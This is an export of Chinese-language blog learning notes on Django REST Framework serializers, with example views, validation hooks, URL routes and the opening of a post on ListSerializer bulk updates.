<h4 id="子路由层-api-urls-py"><a href="#子路由层-api-urls-py" class="headerlink" title="子路由层 api/urls.py"></a>子路由层 <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="序列化层-api-serializers-py-1"><a href="#序列化层-api-serializers-py-1" class="headerlink" title="序列化层 api/serializers.py"></a>序列化层 <code>api/serializers.py</code></h4><details>

<summary> <b><i>Source Code</i></b> </summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelDeserializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># 一些只参与反序列化的字段，但是不是与数据库关联的，自定义不入库的反序列化的字段</span></span><br><span class="line">    <span class="comment"># 自定义字段的 read_only属性必须定义在CharField，不能写在下方的extra_kwargs中，否则会被传入models.Book进行反序列化而报错</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        exclude = [<span class="string">'is_delete'</span>, <span class="string">'create_time'</span>, <span class="string">'img'</span>]</span><br><span class="line">        <span class="comment"># fields = ('name', 'price', 'publish', 'authors','re_name')  #没有默认值的字段必须序列化，为其传值</span></span><br><span class="line">        <span class="comment"># extra_kwargs 用来完成反序列化字段的 系统校验规则</span></span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,  <span class="comment"># 设置name字段必填</span></span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'必填项'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'太短'</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 局部钩子校验单个字段  validate_字段名</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span>  <span class="comment"># value是字段name的值</span></span><br><span class="line">        <span class="comment"># 书名不能包含 g 字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'该g书不能出版'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="comment"># 全局钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)  <span class="comment"># publish如果是外键字段，这个就是publish对象</span></span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(name=name, publish=publish):</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(&#123;<span class="string">'book'</span>: <span class="string">'该书已存在'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注意：ModelSerializer类已经帮我们实现了 create 与 update 方法,不需要写create就能创建</span></span><br></pre></td></tr></table></figure>

</details>

<h4 id="视图层-views-py-1"><a href="#视图层-views-py-1" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        book_ser = serializers.BookModelDeserializer(data=request_data)</span><br><span class="line">        <span class="comment"># raise_exception=True：当校验失败，马上终止当前视图方法，抛异常返回给前台</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_obj = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_obj).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<h4 id="子路由层-api-urls-py-1"><a href="#子路由层-api-urls-py-1" class="headerlink" title="子路由层 api/urls.py"></a>子路由层 <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<div class="note warning">
            <h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ol><li><p>反序列化层：</p><ul><li>在设置<code>fields</code>，没有默认值的字段都必须设置反序列化保存到数据库中</li><li>使用<code>extra_kwargs</code> 来设置系统校验规则</li><li>设置局部钩子和全局钩子</li><li><code>ModelSerializer</code>类已经帮我们实现了 <code>create</code> 与 <code>update</code> 方法，不需要再写</li></ul></li><li><p>视图层：</p><ul><li>POST请求通过<code>request.data</code>拿到数据包</li><li>传给反序列化 ,通过<code>data=request_data</code>传入需要反序列化的数据</li><li><code>is_valid</code>判断校验是否合格 ，<code>raise_exception=True</code>必须要写的</li><li>通过<code>.save()</code>保存到数据库中</li></ul></li></ol>
          </div>

<h3 id="序列化与反序列化整合"><a href="#序列化与反序列化整合" class="headerlink" title="序列化与反序列化整合"></a>序列化与反序列化整合</h3><h4 id="序列化层-api-serializers-py-2"><a href="#序列化层-api-serializers-py-2" class="headerlink" title="序列化层 api/serializers.py"></a>序列化层 <code>api/serializers.py</code></h4><details>

<summary> <b><i>Source Code</i></b> </summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># 一些只参与反序列化的字段，但是不是与数据库关联的，自定义不入库的反序列化的字段</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>,</span><br><span class="line">                  <span class="string">'publish_name'</span>, <span class="string">'publish'</span>, <span class="string">'authors'</span>, <span class="string">'re_name'</span>)</span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'必填项'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'太短'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'authors'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'img'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'author_list'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish_name'</span>: &#123;</span><br><span class="line">                <span class="string">'read_only'</span>: <span class="literal">True</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="comment"># 书名不能包含 g 字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'该g书不能出版'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)</span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="comment"># 视频里使用这种验证方式，实际是不合理的，因为会导致针对价格修改的PUT请求失败(name&amp;publish已存在)</span></span><br><span class="line">        <span class="comment"># 因此在这里将其注释掉 ，正确的方式是在models.Book中对这两个字段的共同唯一性作约束</span></span><br><span class="line">        <span class="comment"># 而本函数通常作为对不同attr的对比验证，如两次输入密码是否一致等</span></span><br><span class="line">        <span class="comment"># if models.Book.objects.filter(name=name, publish=publish):</span></span><br><span class="line">        <span class="comment">#     raise ValidationError(&#123;'book': '该书已存在'&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> attrs</span><br></pre></td></tr></table></figure>

</details>

<div class="note warning">
            <h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><ol><li><code>fields</code>中设置所有序列化与反序列化字段</li><li><code>extra_kwargs</code>划分只序列化或只反序列化字段（一般我们把需要存入到数据库中的使用<code>write_only</code>（反序列化）,只需要展示的就read_only(序列化)，看需求设计）<ul><li><code>write_only</code>：只反序列化</li><li><code>read_only</code>：只序列化</li><li>自定义字段默认只序列化(<code>read_only</code>)</li><li>如果字段没设置<code>write_only</code>或者<code>read_only</code>，那么该字段可以序列化和反序列化</li></ul></li><li>设置反序列化所需的 系统、局部钩子、全局钩子 等校验规则</li></ol>
          </div>

<h4 id="视图层-views-py-2"><a href="#视图层-views-py-2" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h4><details>

<summary> <b><i>Source Code</i></b> </summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># 单查</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># 序列化</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'参数有误'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># 群查</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(is_delete=<span class="literal">False</span>).all()</span><br><span class="line">            book_data = serializers.V2BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># 序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 单增:传的数据是与model对应的一个字典</span></span><br><span class="line">        <span class="comment"># 群增：设计传递的是多个model对应的字典列表,在postman中通过列表嵌套字典传值</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="keyword">if</span> isinstance(request_data, dict):  <span class="comment"># 判断获取的数据是否是dict</span></span><br><span class="line">            many = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(request_data, list):  <span class="comment"># 判断获取的数据是否是list</span></span><br><span class="line">            many = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'数据错误'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        book_ser = serializers.V2BookModelSerializer(</span><br><span class="line">            data=request_data, many=many)  <span class="comment"># 反序列化</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># book_result是对象&lt;class 'app01.models.Book'&gt;，群增就是列表套一个个对象</span></span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.V2BookModelSerializer(book_result, many=many).data</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单删: 有pk   #在postman中通过路径传参</span></span><br><span class="line">    <span class="comment"># 群删：有pks   &#123;"pks": [1, 2, 3]&#125;   #通过json传参</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            pks = [pk]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pks = request.data.get(<span class="string">'pks'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(pk__in=pks, is_delete=<span class="literal">False</span>).update(is_delete=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'删除成功'</span></span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'删除失败'</span></span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

</details>

<div class="note warning">
            <h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><ol><li>序列化数据最后必须要<code>.data</code> （因为要传给前端）</li><li>反序列化通过<code>data</code>传参，序列化通过<code>instance</code>传参（当你只传一个参数时，默认是<code>instance</code>的参数）</li><li>反序列化与序列化都能使用<code>many=True</code>，序列化和反序列化数据只要被[]嵌套都要写<code>many=True</code></li></ol>
          </div>

<h4 id="子路由层-api-urls-py-2"><a href="#子路由层-api-urls-py-2" class="headerlink" title="子路由层 api/urls.py"></a>子路由层 <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.V2Book.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.V2Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h1 id="使用场景总结"><a href="#使用场景总结" class="headerlink" title="使用场景总结"></a>使用场景总结</h1><p>序列化类初始化时，<code>instance</code>/<code>data</code>/<code>many</code>/<code>partial</code> 是影响序列化对象行为的四个关键参数。</p>
<h2 id="序列化角度"><a href="#序列化角度" class="headerlink" title="序列化角度"></a>序列化角度</h2><h3 id="序列化-1"><a href="#序列化-1" class="headerlink" title="序列化"></a>序列化</h3><p>如果没有<code>data</code>参数，只有<code>instance</code>，那么就不存在反序列化校验一说，只有序列化对象<code>instance</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 序列化get （给前端传递参数）  #查询</span></span><br><span class="line">ser_obj = ModelSerializer(model_obj)   <span class="comment">#只传递一个参数，默认是instance的参数，查询数据</span></span><br></pre></td></tr></table></figure>

<h3 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h3><p>如果有<code>data</code>，没有<code>instance</code>，则需要调用<code>is_valid</code>方法校验<code>data</code>，然后将<code>data</code>进行反序列化，得到<code>validated_data</code>，此时再通过序列化对象获取<code>data</code>，这个<code>data</code>和初始化提供的<code>data</code>不同，是序列化<code>validated_data</code>后的<code>data</code>，比起初始化<code>data</code>，可能减少了无效的字段（序列化没有定义的字段）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反序列化post  save() =&gt; create()（数据保存到数据库中）  #添加</span></span><br><span class="line">ser_obj = ModelSerializer(data=model_data)  <span class="comment">#传递data参数，保存数据</span></span><br></pre></td></tr></table></figure>

<h3 id="数据操作角度（增删改查）"><a href="#数据操作角度（增删改查）" class="headerlink" title="数据操作角度（增删改查）"></a>数据操作角度（增删改查）</h3><h2 id="修改场景"><a href="#修改场景" class="headerlink" title="修改场景"></a>修改场景</h2><ul>
<li>如果同时提供了<code>instance</code>及<code>data</code>, 那么只要有<code>data</code>或者部分<code>data</code>，<code>data</code>都要进行验证才能进行下面的<code>save</code>等操作，如果不经过<code>is_valid</code>过程，那么后面的获取序列化数据或者反序列化数据都会无效。</li>
<li>要用<code>instance</code>指明要修改的对象<code>partial</code>用于部分更新，之所以要伴随<code>instance</code>，是因为要指明给<code>save</code>用，在<code>save</code>操作时给那个<code>instance</code>部分更新。逻辑这回走到下面源码中的<code>get_initial()</code>获取要进行更新<code>instance</code>的字段数据。</li>
</ul>
<h3 id="单改"><a href="#单改" class="headerlink" title="单改"></a>单改</h3><ol>
<li>单整体改，说明前台要提供修改的数据，修改之后保存的数据需要校验，校验的数据应该在实例化“序列化类对象”时，赋值给<code>data</code></li>
<li>修改，就必须明确被修改的模型类对象，并在实例化“序列化类对象”时，赋值给<code>instance</code>，必须赋值给<code>instance</code></li>
<li>整体修改，所有校验规则有<code>required=True</code>的字段，都必须提供，因为在实例化“序列化类对象”时，参数<code>partial</code>默认为<code>False</code></li>
</ol>
<h4 id="整体改-PUT"><a href="#整体改-PUT" class="headerlink" title="整体改(PUT)"></a>整体改(<code>PUT</code>)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># 要被更新的对象</span></span><br><span class="line">    data=model_data, <span class="comment"># 用来更新的数据</span></span><br><span class="line">    partial=<span class="literal">False</span>, <span class="comment"># 默认False，必须的字段全部参与校验</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="局部改-PATCH"><a href="#局部改-PATCH" class="headerlink" title="局部改(PATCH)"></a>局部改(<code>PATCH</code>)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">V2BookModelSerializer(</span><br><span class="line">    instance=model_obj, <span class="comment"># 要被更新的对象, </span></span><br><span class="line">    data=model_data, <span class="comment"># 用来更新的数据,</span></span><br><span class="line">    partial=<span class="literal">True</span>, <span class="comment"># 设置True，必须的字段都变为选填字段</span></span><br><span class="line">)</span><br><span class="line">    <span class="comment"># 注：partial设置True的本质就是使字段 required=True 校验规则失效</span></span><br></pre></td></tr></table></figure>

<h2 id="群改-ListSerializer"><a href="#群改-ListSerializer" class="headerlink" title="群改 ListSerializer"></a>群改 <code>ListSerializer</code></h2><p><code>many</code>参数将直接影响序列化类的类型，如果是<code>many=False</code>，那么直接使用当前序列化类。如果<code>many=True</code>，将实例化一个<code>ListSerializer</code>类来序列化或者反序列化类。</p>
<p>在前面的代码中，我们在<code>V2BookModelSerializer</code>类中并没有做对多对象序列化的特殊处理，但V2版本的api仍然支持群增和群删操作。究其原因，是由于<code>BaseSerializer.__new__</code>方法）或者<code>class Meta:</code>中定义了<code>list_serializer_class</code>指定的多对象序列化类。</p>
<p>关于 <code>ListSerializer</code>的详细介绍请看下一篇。</p>
<h1 id="给序列化类传入自定义数据"><a href="#给序列化类传入自定义数据" class="headerlink" title="给序列化类传入自定义数据"></a>给序列化类传入自定义数据</h1><p>视图类<code>views.py</code>使用<code>context</code>传递参数给序列化类<code>serializers.py</code></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ol>
<li>在视图类中实例化序列化对象时，可以设置<code>context</code>内容</li>
<li>在序列化类中的<code>局部钩子</code>、<code>全局钩子</code>、<code>create</code>、<code>update</code>方法中，都可以用<code>self.context</code>访问视图类传递过来的内容。</li>
</ol>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>例如有类似如下需求时：</p>
<ul>
<li>在视图类<code>views</code>中，可以通过<code>request</code>得到登陆用户<code>request.user</code></li>
<li>在序列化类中，要完成数据库数据的校验与入库操作，可能会需要知道当前的登陆用户，但序列化类默认无法访问<code>request</code></li>
</ul>
<p>因此在视图类中实例化序列化对象时，将<code>request</code>对象传递进去</p>
<h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><h3 id="视图层-views-py-3"><a href="#视图层-views-py-3" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_ser = serializers.BookModelSerializer(data=request_data,context=&#123;<span class="string">'request'</span>:request&#125;)   <span class="comment">#视图层context传递参数</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_result = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_result).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<h3 id="序列化层-serializers-py"><a href="#序列化层-serializers-py" class="headerlink" title="序列化层 serializers.py"></a>序列化层 <code>serializers.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        print(self.context.get(<span class="string">'request'</span>).method)  <span class="comment">#序列化层接收参数</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>

<h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81YTY4OTM0NTUxODgyNTczNDQzY2RkZjg=">django rest framework serializers小结<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（九）：序列化模块 serialziers 之 ListSerializer类</title>
    <url>/tech/drf-learning-notes-9-the-listserializer-class-in-serialziers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (8): the ModelSerializer class in serialziers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzlfZHJmX0xpc3RTZXJpYWxpemVy">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>DRF常用序列化类主要有</p>
<ul>
<li><code>rest_framework.serialziers.Serializer</code></li>
<li><code>rest_framework.serialziers.ModelSerializer</code></li>
<li><code>rest_framework.serialziers.ListSerializer</code></li>
</ul>
<p>本篇介绍<code>rest_framework.serialziers.ListSerializer</code>，将继续以图书管理系统实例说明。</p>
<a id="more"></a>

<h1 id="使用场景之群改群增群改"><a href="#使用场景之群改群增群改" class="headerlink" title="使用场景之群改群增群改"></a>使用场景之群改群增群改</h1><p>当一个序列化器在带有<code>many=True</code>选项被序列化时，将创建一个<code>ListSerializer</code>实例，该序列化器类将成为<code>ListSerializer</code>类的子类。<br>当你需要自定义多个对象的行为时（比如群增，群改）,你需要手动定制<code>ListSerializer</code>类的一些行为。<br>可以通过在自定义序列化器的<code>Meta</code>类下面的<code>list_serializer_class</code>来绑定你需要的的<code>ListSerializer</code>类</p>
<h1 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h1><p>群改需要设置<code>ListSerializer</code>，创建<code>BookListSerializer</code>继承<code>ListSerializer</code>，重写<code>update</code>方法</p>
<h2 id="序列化层-serializer-py"><a href="#序列化层-serializer-py" class="headerlink" title="序列化层 serializer.py"></a>序列化层 <code>serializer.py</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重点：ListSerializer与ModelSerializer建立关联的是： 在ModelSerializer的Meta类中设置   list_serializer_class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span>  <span class="comment"># print(instance)  # 要更新的对象们</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # 更新的对象对应的数据们</span></span><br><span class="line">        <span class="comment"># print(self.child)  # 服务的模型序列化类 - V3BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V3BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            <span class="comment"># 群改，list_serializer_class是固定的key写法，直接转入BookListSerializer类的 update 方法</span></span><br><span class="line">            list_serializer_class = BookListSerializer</span><br></pre></td></tr></table></figure>

<p>之所以需要实现<code>update</code>方法，群改时会走 <code>rest_framework.serializers.ListSerializer</code>中的<code>update</code>函数，而该函数并未被实现。</p>
<p>而群增不需要重写<code>create</code>方法，因为源码中<code>rest_framework.serializers.ListSerializer</code>走的就是<code>ModelSerializer</code>的<code>create</code>方法:</p>
